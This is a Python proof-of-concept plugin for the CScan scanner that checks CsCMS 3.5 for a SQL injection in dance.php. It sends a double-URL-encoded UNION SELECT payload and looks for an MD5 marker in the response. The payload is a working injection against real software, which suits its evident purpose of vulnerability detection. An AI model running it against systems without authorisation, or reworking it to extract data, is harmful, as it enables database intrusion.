# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'CsCMS_0001'  # 平台漏洞编号，留空
    name = 'CsCMS 3.5 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-05-05'  # 漏洞公布时间
    desc = '''
        CsCMS 3.5版本的dance.php中参数未过滤，导致SQL注入的产生。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CsCMS'  # 漏洞应用名称
    product_version = '3.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '38baad55-ce53-4039-9e7b-3117505e7339'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '%s/index.php/dance/so/key/?key=' % self.target
            payload = '%252527)%20%2561%256E%2564%201=2%20union%20%2573%2565%25' \
                      '6C%2565%2563%2574%201,md5(1231231234),3,4,5,6,7,8,9,10,1' \
                      '1,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,' \
                      '30,31,32,33,34,35,36,37,38,39,40,41,42%23'

            content = requests.get(verify_url+payload).text
            if 'f3c9f8ff331dab41a2363bca631e7aff' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
